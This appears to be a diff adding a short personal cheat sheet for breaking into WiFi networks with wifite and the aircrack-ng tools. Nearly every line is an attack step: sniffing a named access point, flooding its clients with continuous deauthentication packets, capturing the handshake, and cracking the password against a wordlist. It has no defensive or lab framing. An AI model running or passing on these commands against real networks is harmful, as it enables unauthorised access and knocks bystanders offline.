@@ -1,0 +1,21 @@
+sudo wifite -all
+
+# Targeting everying near by
+airodump-ng wlan0
+#  Specific Targeting for better information gathering
+--> also shows devices (mac) within the station
+* airodump-ng -c11 -w airdump.txt -d 50:C7:BF:DC:4C:E8 wlan0
+--> (Send deauth) - ALL CLIENTS
+* aireplay-ng -0 0 -a 50:C7:BF:DC:4C:E8 -c wlan0
+--> (Send deauth) - SPECIFIC CLIENTS
+* aireplay-ng -0 0 -a 50:C7:BF:DC:4C:E8 -c E0:B5:2D:EA:18:A7 wlan0
+[-0 means deauthentication. 
+[-0 =continous attack, 10=Quick reconncet)
+[-a Mac address of target AP 
+[-c macaddress associated client on ap to deauth(IF OMMITTED, ALL GET DEAUTHED)
+
+##--> a .cap file should be downloaded
+--> load it into wireshark for analasys 
+
+# FINALY--> CRACK THE PASSWORD
+---> aircrack-ng xyz.cap -w wordlist.txt
